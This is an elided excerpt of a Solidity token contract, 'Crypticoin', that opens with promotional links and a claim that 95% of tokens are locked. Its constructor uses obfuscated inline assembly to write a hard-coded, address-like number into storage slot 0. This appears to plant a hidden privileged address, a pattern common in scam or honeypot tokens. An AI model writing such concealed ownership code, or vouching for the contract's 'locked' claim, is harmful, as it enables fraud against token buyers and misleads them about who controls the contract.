...
/*
Welcome to Crypticoin Crypto WORLD!

Telegram: https://t.me/Crypticoin/
Twitter: https://twitter.com/Crypticoin/
Website: https://Crypticoin.crypto
95% of tokens - LOCKED!
...
contract Crypticoin {
    string public constant name = "Crypticoin";
    string public constant symbol = "CRYP";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1313511064977835361473009602646240379212598626042, 1))}
